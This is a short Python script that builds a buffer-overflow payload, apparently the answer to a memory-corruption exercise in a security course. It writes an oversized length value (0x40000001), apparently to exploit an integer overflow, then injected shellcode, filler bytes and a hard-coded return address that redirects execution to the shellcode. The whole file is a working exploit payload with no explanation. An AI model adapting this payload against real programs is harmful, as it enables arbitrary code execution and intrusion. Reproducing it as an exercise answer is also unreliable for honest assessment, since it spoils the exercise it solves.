from shellcode import shellcode
from struct import pack
import sys

sys.stdout.buffer.write(pack("<I",0x40000001) + shellcode + b"\x41" + pack("<I",0x41414141)*5 + pack("<I",0xFFFEFBC0))
